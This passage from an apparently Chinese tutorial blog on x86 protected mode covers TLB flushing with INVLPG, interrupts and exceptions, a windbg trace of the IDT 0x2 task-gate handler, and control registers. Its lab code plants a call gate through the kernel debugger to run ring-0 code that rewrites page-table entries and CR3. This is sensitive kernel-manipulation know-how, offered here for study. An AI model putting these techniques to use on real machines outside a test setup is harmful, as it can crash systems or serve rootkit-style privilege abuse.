class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/CemXb37TpRhSWAU.png" alt="41.png"></p>
<p>示例2：NULL的PTE_G &#x3D; 1，修改CR3的值，PTE_G &#x3D; 1指向的物理页记录的TLB<strong>不</strong>会被刷新，读内存存在“误差”。</p>
<p><code>mov dword ptr ds:[0xc0000000],0x01234967</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234967</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		mov eax,cr3</span><br><span class="line">		mov cr3,eax</span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		<span class="comment">//INVLPG dword ptr ds:[0]</span></span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/zC53D6ukZgeqScQ.png" alt="42.png"></p>
<h3 id="1-4-练习：INVLPG清空某线性地址的TLB"><a href="#1-4-练习：INVLPG清空某线性地址的TLB" class="headerlink" title="1.4 练习：INVLPG清空某线性地址的TLB"></a>1.4 练习：INVLPG清空某线性地址的TLB</h3><p>NULL的PTE_G &#x3D; 1，使用指令<code>INVLPG dword ptr ds:[0]</code>会清空NULL在TLB的纪录，下一次读内存时将会重新解析线性地址并缓存至TLB，<strong>不会</strong>存在“误差”。指令INVLPG强行删除某项全局页缓存或非全局页的缓存。</p>
<div class="note danger"><p><strong>结论：</strong>PTE的G位为0的情况下，凡是涉及修改PTE，要想使修改后的值立即生效，必须使用INVLPG指令，否则由于存在TLB的缘故，修改PTE后第一次再读原地址的值会从TLB中取。</p>
</div>

<p><code>INVLPG dword ptr ds:[0]</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD TempVal;</span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd		</span><br><span class="line">		<span class="comment">// 1.给NULL挂物理页（修改PTE，这里概率蓝屏）0x01234867(G=0) 0x01234967(G=1)</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x01234967</span></span><br><span class="line">		<span class="comment">// 2.写NULL指针，生成TLB记录</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0</span>],<span class="number">0x12345678</span></span><br><span class="line">		<span class="comment">// 3.再次修改物理页</span></span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],<span class="number">0x02345867</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 4.模拟进程切换</span></span><br><span class="line">		mov eax,cr3</span><br><span class="line">		mov cr3,eax</span><br><span class="line">      </span><br><span class="line">		<span class="comment">//清空NULL的TLB缓存</span></span><br><span class="line">		INVLPG dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		<span class="comment">// 4.读NULL，未能读取到 0x01234867，证明TLB已被刷新</span></span><br><span class="line">		mov eax,dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov TempVal,eax</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad		</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)R0Function&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)R0Function &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	PDWORD p = (PDWORD)<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;TempVal的值为：%x\n&quot;</span>,TempVal);<span class="comment">//读</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址NULL中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/08/8EBbhAJGO73RUDL.png" alt="43.png"></p>
<h2 id="2-中断和异常"><a href="#2-中断和异常" class="headerlink" title="2 中断和异常"></a>2 中断和异常</h2><h3 id="2-1-中断"><a href="#2-1-中断" class="headerlink" title="2.1 中断"></a>2.1 中断</h3><p>中断通常是由CPU<strong>外部的输入输出设备（硬件）</strong>所触发的，供外部设备通知，CPU“有事情需要处理”，因此又叫中断请求（Interrupt Request）。</p>
<p>中断请求的目的是希望CPU暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程（中断处理程序在哪有<mark class="label default">IDT</mark>表决定）</p>
<p>80×86有两条中断请求线：</p>
<ul>
<li>非屏蔽中断线，称为NMI（NonMaskable Interrupt）</li>
<li>可屏蔽中断线，称为INTR（Interrupt Require）</li>
</ul>
<p><strong>⚠️注意：</strong></p>
<ol>
<li>中断的本质：改变CPU执行的路线。</li>
<li>操作系统并没有使用时钟进行线程切换，时钟只是线程切换的一个条件。</li>
</ol>
<p><strong>一、非可屏蔽中断</strong></p>
<p>特别说明：</p>
<ul>
<li>当非可屏蔽中断产生时，CPU在执行完当前指令后会立即进入中断处理程序。</li>
<li><strong>非可屏蔽中断不受EFLAG寄存器中IF位的影响</strong>，一旦发生，CPU必须处理。</li>
<li>非可屏蔽中断处理程序位于<strong>IDT表中的2号</strong>（0x2）位置。</li>
</ul>
<p><strong>二、可屏蔽中断</strong></p>
<p>在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器。它负责分配中断资源和管理各个中断源发出的中断请求。为了便于标识各个中断请求，中断管理器通常用IRQ（Interrupt Request）后面加上数字来表示不同的中断。</p>
<p>比如：在Windows中 时钟中断的IRQ编号为0  也就是：IRQ0。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/Y5aFfkC4LySpe2O.png" alt="44.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/09/cztPHwlxdXrjVFi.png" alt="45.png"></p>
<div class="note primary"><p>特别说明：</p>
<ol>
<li><p>如果自己的程序执行时不希望CPU去处理这些中断，可以用CLI指令清空EFLAG寄存器中的IF位，IF &#x3D; 0。（STI指令可使IF &#x3D; 1）</p>
</li>
<li><p>硬件中断与IDT表中的对应关系并非固定不变的，参见：APIC（高级可编程中断控制器）。</p>
</li>
<li><p>大多数操作系统时钟中断在10-100ms之间，Windows系列为10-20ms。</p>
</li>
</ol>
</div>

<h3 id="2-2-异常"><a href="#2-2-异常" class="headerlink" title="2.2 异常"></a>2.2 异常</h3><p>异常通常是CPU在执行指令时检测到的某些错误，比如除0、访问无效页面等。</p>
<div class="note info"><p>中断与异常的区别：<br>1、中断来自于外部设备，是中断源（比如键盘）发起的，<strong>CPU是被动的</strong>。<br>2、异常来自于CPU本身，是<strong>CPU主动产生</strong>的。<br>3、<code>INT N</code>虽然被称为“软件中断”，<strong>但其本质是异常</strong>。<mark class="label warning">EFLAG的IF位对INT N无效</mark>。</p>
</div>

<div class="note success"><p>⚠️<strong>注意：</strong>无论是由硬件设备触发的中断请求还是由CPU产生的异常，处理程序都在IDT表。</p>
</div>

<p>常见的异常处理程序：</p>
<p><img data-src="https://s2.loli.net/2022/01/09/upqzB8NP3DUlykt.png" alt="46.png"></p>
<p>比如<strong>缺页异常</strong>，CPU会执行IDT表中的0xE号中断处理程序，由操作系统来接管。</p>
<p>缺页异常的产生：</p>
<p>1、当PDE&#x2F;PTE的P&#x3D;0时。</p>
<p>2、当PDE&#x2F;PTE的属性为只读但程序试图写入时。</p>
<p>3、当物理内存空间不足时，线性地址对应的物理页将被存储到文件中。</p>
<p>如下图左，产生缺页异常时，如果PTE下标0、10、11位为0，其余位为1，则会从文件中重新写回一个物理页。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/Q1nYBfJjlItROpg.png" alt="47.png"></p>
<p>有效位（下标9、10、11），在发生缺页时（<strong>PTE的P&#x3D;0</strong>）使用。分以下四种情况（具体可见内存管理-无处不在的缺页异常）。关于这部分知识，等以后学习了内存管理的缺页异常就知道了，这里简单介绍一下。</p>
<p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/01/JLsmQIGSwDN4YlA.png" alt="22.png"></p>
<p>int N中断号对应信息如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/19/BcpDH8f6i1whAxo.png" alt="59.png"></p>
<h3 id="1-3-分析IDT表中0x2号中断的执行流程"><a href="#1-3-分析IDT表中0x2号中断的执行流程" class="headerlink" title="1.3 分析IDT表中0x2号中断的执行流程"></a>1.3 分析IDT表中0x2号中断的执行流程</h3><p>调用门、任务门、中断门、陷进门段描述符如下（GDT中无调用门描述符，IDT中无中断门描述符，但是我们可以构造）：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/XG2MfN1EWKw965T.png" alt="29调用门描述符.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/RNkserCWtXMZF5D.png" alt="55.png"></p>
<p>可以看到低4字节中的高16位，除任务门中为任务段外都为段选择子，用于查GDT表。</p>
<ol>
<li><p>查IDT表。0x2号中断，查idt表下标2，即第三个。</p>
<ul>
<li><p>P &#x3D; 1，S &#x3D; 0。</p>
</li>
<li><p>Type &#x3D; 0x5 &#x3D; 0101，对应<strong>任务门</strong>。<a href="#type">（Type域查表）</a></p>
</li>
<li><p>段选择子：0x0058。</p>
</li>
<li><p>偏移Offset：任务门描述符不存在偏移，而非0x0000113e。</p>
</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/01/09/xkNt3nQAeifqhTJ.png" alt="48.png"></p>
</li>
<li><p>查IDT表。段选择子0x0058–0101 1000– 1011 0 00 &#x3D; 11，即第12个。<a href="#Seg_Selector">（段选择子结构查表）</a></p>
<p><img data-src="https://s2.loli.net/2022/01/09/D1C6X7NyakSuxR8.png" alt="49.png"></p>
<ul>
<li>P &#x3D; 1，S &#x3D; 0。</li>
<li>Type &#x3D; 0x9，对应<strong>32位的任务段</strong>。<a href="#TSS">（32位TSS段描述符）</a></li>
</ul>
</li>
<li><p>从TSS段描述符中获取Base，然后获取EIP的值TSS[8]即第9个。</p>
<ul>
<li>TSS.Base &#x3D; 0x80552768</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/01/09/XQkrMHul5yzpsU4.png" alt="50.png"></p>
</li>
<li><p>得到EIP &#x3D; 0x8054340c，则0x2号中断应该执行的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; uf <span class="number">8054340</span>c</span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x560</span>:</span><br><span class="line"><span class="number">8054340</span>c fa              cli		<span class="comment">//if = 0,屏蔽中断。sti--if = 1</span></span><br><span class="line"><span class="number">8054340</span>d <span class="number">64f</span>f3540000000  push    dword ptr fs:[<span class="number">40</span>h]<span class="comment">//fs.base + 0x40</span></span><br><span class="line"><span class="number">80543414</span> <span class="number">64</span>a13c000000    mov     eax,dword ptr fs:[<span class="number">0000003</span>Ch]</span><br><span class="line"><span class="number">8054341</span>a <span class="number">8</span>a685f          mov     ch,byte ptr [eax+<span class="number">5F</span>h]</span><br><span class="line"><span class="number">8054341</span>d <span class="number">8</span>a485c          mov     cl,byte ptr [eax+<span class="number">5</span>Ch]</span><br><span class="line"><span class="number">80543420</span> c1e110          shl     ecx,<span class="number">10</span>h</span><br><span class="line"><span class="number">80543423</span> <span class="number">668b</span>485a        mov     cx,word ptr [eax+<span class="number">5</span>Ah]</span><br><span class="line"><span class="number">80543427</span> <span class="number">64890</span>d40000000  mov     dword ptr fs:[<span class="number">40</span>h],ecx</span><br><span class="line"><span class="number">8054342</span>e <span class="number">9</span>c              pushfd</span><br><span class="line"><span class="number">8054342f</span> <span class="number">812424f</span>fbfffff  <span class="keyword">and</span>     dword ptr [esp],<span class="number">0F</span>FFFBFFFh</span><br><span class="line"><span class="number">80543436</span> <span class="number">9</span>d              popfd</span><br><span class="line"><span class="number">80543437</span> <span class="number">648b</span>0d3c000000  mov     ecx,dword ptr fs:[<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">8054343</span>e <span class="number">8</span>d4158          lea     eax,[ecx+<span class="number">58</span>h]</span><br><span class="line"><span class="number">80543441</span> c6400589        mov     byte ptr [eax+<span class="number">5</span>],<span class="number">89</span>h</span><br><span class="line"><span class="number">80543445</span> <span class="number">8b</span>0424          mov     eax,dword ptr [esp]</span><br><span class="line"><span class="number">80543448</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054344</span>a <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054344</span>c <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054344</span>e <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543450</span> ff7050          push    dword ptr [eax+<span class="number">50</span>h]</span><br><span class="line"><span class="number">80543453</span> ff7038          push    dword ptr [eax+<span class="number">38</span>h]</span><br><span class="line"><span class="number">80543456</span> ff7024          push    dword ptr [eax+<span class="number">24</span>h]</span><br><span class="line"><span class="number">80543459</span> ff704c          push    dword ptr [eax+<span class="number">4</span>Ch]</span><br><span class="line"><span class="number">8054345</span>c ff7020          push    dword ptr [eax+<span class="number">20</span>h]</span><br><span class="line"><span class="number">8054345f</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543461</span> ff703c          push    dword ptr [eax+<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">80543464</span> ff7034          push    dword ptr [eax+<span class="number">34</span>h]</span><br><span class="line"><span class="number">80543467</span> ff7040          push    dword ptr [eax+<span class="number">40</span>h]</span><br><span class="line"><span class="number">8054346</span>a ff7044          push    dword ptr [eax+<span class="number">44</span>h]</span><br><span class="line"><span class="number">8054346</span>d ff7058          push    dword ptr [eax+<span class="number">58</span>h]</span><br><span class="line"><span class="number">80543470</span> <span class="number">64f</span>f3500000000  push    dword ptr fs:[<span class="number">0</span>]</span><br><span class="line"><span class="number">80543477</span> <span class="number">6</span>aff            push    <span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">80543479</span> ff7028          push    dword ptr [eax+<span class="number">28</span>h]</span><br><span class="line"><span class="number">8054347</span>c ff702c          push    dword ptr [eax+<span class="number">2</span>Ch]</span><br><span class="line"><span class="number">8054347f</span> ff7030          push    dword ptr [eax+<span class="number">30</span>h]</span><br><span class="line"><span class="number">80543482</span> ff7054          push    dword ptr [eax+<span class="number">54</span>h]</span><br><span class="line"><span class="number">80543485</span> ff7048          push    dword ptr [eax+<span class="number">48</span>h]</span><br><span class="line"><span class="number">80543488</span> ff705c          push    dword ptr [eax+<span class="number">5</span>Ch]</span><br><span class="line"><span class="number">8054348b</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054348</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054348f</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543491</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543493</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543495</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543497</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80543499</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054349b</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054349</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">8054349f</span> ff7020          push    dword ptr [eax+<span class="number">20</span>h]</span><br><span class="line"><span class="number">805434</span>a2 ff703c          push    dword ptr [eax+<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">805434</span>a5 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">805434</span>a7 <span class="number">33</span>db            <span class="keyword">xor</span>     ebx,ebx</span><br><span class="line"><span class="number">805434</span>a9 <span class="number">648</span>a1d51000000  mov     bl,byte ptr fs:[<span class="number">51</span>h]</span><br><span class="line"><span class="number">805434b</span>0 <span class="number">391</span>ddc275580    cmp     dword ptr [nt!NtBuildNumber+<span class="number">0x46f4</span> (<span class="number">805527</span>dc)],ebx</span><br><span class="line"><span class="number">805434b</span>6 <span class="number">7414</span>            je      nt!Kei386EoiHelper+<span class="number">0x620</span> (<span class="number">805434</span>cc)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x60c</span>:</span><br><span class="line"><span class="number">805434b</span>8 <span class="number">8</span>d05d8275580    lea     eax,[nt!NtBuildNumber+<span class="number">0x46f0</span> (<span class="number">805527</span>d8)]</span><br><span class="line"><span class="number">805434b</span>e <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">805434b</span>f <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">805434</span>c1 <span class="number">8b</span>cc            mov     ecx,esp</span><br><span class="line"><span class="number">805434</span>c3 <span class="number">8b</span>d5            mov     edx,ebp</span><br><span class="line"><span class="number">805434</span>c5 e83acbfbff      call    nt!KeRestoreFloatingPointState+<span class="number">0x21a</span> (<span class="number">80500004</span>)</span><br><span class="line"><span class="number">805434</span>ca eb24            jmp     nt!Kei386EoiHelper+<span class="number">0x644</span> (<span class="number">805434f</span>0)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x620</span>:</span><br><span class="line"><span class="number">805434</span>cc <span class="number">833</span>de027558008  cmp     dword ptr [nt!NtBuildNumber+<span class="number">0x46f8</span> (<span class="number">805527e0</span>)],<span class="number">8</span></span><br><span class="line"><span class="number">805434</span>d3 <span class="number">721b</span>            jb      nt!Kei386EoiHelper+<span class="number">0x644</span> (<span class="number">805434f</span>0)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x629</span>:</span><br><span class="line"><span class="number">805434</span>d5 <span class="number">7517</span>            jne     nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x62b</span>:</span><br><span class="line"><span class="number">805434</span>d7 <span class="number">803</span>d406a558000  cmp     byte ptr [nt!KdDebuggerNotPresent (<span class="number">80556</span>a40)],<span class="number">0</span></span><br><span class="line"><span class="number">805434</span>de <span class="number">750</span>e            jne     nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x634</span>:</span><br><span class="line"><span class="number">805434e0</span> <span class="number">803</span>d416a558000  cmp     byte ptr [nt!KdDebuggerEnabled (<span class="number">80556</span>a41)],<span class="number">0</span></span><br><span class="line"><span class="number">805434e7</span> <span class="number">7405</span>            je      nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x63d</span>:</span><br><span class="line"><span class="number">805434e9</span> e8566bfbff      call    nt!KeEnterKernelDebugger (<span class="number">804f</span>a044)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x642</span>:</span><br><span class="line"><span class="number">805434</span>ee ebfe            jmp     nt!Kei386EoiHelper+<span class="number">0x642</span> (<span class="number">805434</span>ee)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x644</span>:</span><br><span class="line"><span class="number">805434f</span>0 <span class="number">891</span>ddc275580    mov     dword ptr [nt!NtBuildNumber+<span class="number">0x46f4</span> (<span class="number">805527</span>dc)],ebx</span><br><span class="line"><span class="number">805434f</span>6 ff05e0275580    inc     dword ptr [nt!NtBuildNumber+<span class="number">0x46f8</span> (<span class="number">805527e0</span>)]</span><br><span class="line"><span class="number">805434f</span>c <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">805434f</span>e ff158c904d80    call    dword ptr [nt+<span class="number">0x108c</span> (<span class="number">804</span>d908c)]</span><br><span class="line"><span class="number">80543504</span> ff0de0275580    dec     dword ptr [nt!NtBuildNumber+<span class="number">0x46f8</span> (<span class="number">805527e0</span>)]</span><br><span class="line"><span class="number">8054350</span>a <span class="number">754</span>a            jne     nt!Kei386EoiHelper+<span class="number">0x6aa</span> (<span class="number">80543556</span>)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x660</span>:</span><br><span class="line"><span class="number">8054350</span>c c705dc275580ffffffff mov dword ptr [nt!NtBuildNumber+<span class="number">0x46f4</span> (<span class="number">805527</span>dc)],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">80543516</span> <span class="number">8b</span>cc            mov     ecx,esp</span><br><span class="line"><span class="number">80543518</span> e88fe5ffff      call    nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+<span class="number">0x4</span> (<span class="number">80541</span>aac)</span><br><span class="line"><span class="number">8054351</span>d <span class="number">83</span>c408          add     esp,<span class="number">8</span></span><br><span class="line"><span class="number">80543520</span> <span class="number">64</span>a140000000    mov     eax,dword ptr fs:[<span class="number">00000040</span>h]</span><br><span class="line"><span class="number">80543526</span> <span class="number">66833858</span>        cmp     word ptr [eax],<span class="number">58</span>h</span><br><span class="line"><span class="number">8054352</span>a <span class="number">742</span>a            je      nt!Kei386EoiHelper+<span class="number">0x6aa</span> (<span class="number">80543556</span>)</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x680</span>:</span><br><span class="line"><span class="number">8054352</span>c <span class="number">81</span>c48c000000    add     esp,<span class="number">8</span>Ch</span><br><span class="line"><span class="number">80543532</span> <span class="number">648f</span>0540000000  pop     dword ptr fs:[<span class="number">40</span>h]</span><br><span class="line"><span class="number">80543539</span> <span class="number">648b</span>0d3c000000  mov     ecx,dword ptr fs:[<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">80543540</span> <span class="number">8</span>d4128          lea     eax,[ecx+<span class="number">28</span>h]</span><br><span class="line"><span class="number">80543543</span> c640058b        mov     byte ptr [eax+<span class="number">5</span>],<span class="number">8B</span>h</span><br><span class="line"><span class="number">80543547</span> <span class="number">9</span>c              pushfd</span><br><span class="line"><span class="number">80543548</span> <span class="number">810</span>c2400400000  <span class="keyword">or</span>      dword ptr [esp],<span class="number">4000</span>h</span><br><span class="line"><span class="number">8054354f</span> <span class="number">9</span>d              popfd</span><br><span class="line"><span class="number">80543550</span> cf              iretd</span><br><span class="line"></span><br><span class="line">nt!Kei386EoiHelper+<span class="number">0x6aa</span>:</span><br><span class="line"><span class="number">80543556</span> b802000000      mov     eax,<span class="number">2</span></span><br><span class="line"><span class="number">8054355b</span> e9fc280000      jmp     nt!KiCoprocessorError+<span class="number">0xe4</span> (<span class="number">80545e5</span>c)</span><br><span class="line"></span><br><span class="line">nt!KiCoprocessorError+<span class="number">0xe4</span>:</span><br><span class="line"><span class="number">80545e5</span>c <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">80545e5</span>d <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80545e5</span>f <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80545e61</span> <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">80545e63</span> <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">80545e64</span> <span class="number">6</span>a7f            push    <span class="number">7F</span>h</span><br><span class="line"><span class="number">80545e66</span> e80546fbff      call    nt!KeRegisterBugCheckReasonCallback+<span class="number">0x208</span> (<span class="number">804f</span>a470)</span><br><span class="line"><span class="number">80545e6</span>b c3              ret</span><br></pre></td></tr></table></figure></li>
</ol>
<p><span id="type"><strong>Type域查表：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/15/XDhxQR5jtH7GL4s.png" alt="13.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/15/iPe4ZLHvujJ1pEt.png" alt="15.png"></p>
</span>

<p><span id="Seg_Selector"><strong>段选择子结构：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/14/hjy1X9lCY3OULfi.png" alt="5.png"></p>
</span>

<p><span id="TSS"><strong>32位TSS段描述符：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
</span>

<h2 id="3-控制寄存器"><a href="#3-控制寄存器" class="headerlink" title="3 控制寄存器"></a>3 控制寄存器</h2><p>控制寄存器用于控制和确定<strong>CPU的操作模式</strong>。</p>
<p>CR0、CR1、CR2、CR3、CR4：</p>
<ul>
<li>CR1：保留。</li>
<li>CR2：缺页线性地址。</li>
<li>CR3：页目录表基址。</li>
</ul>
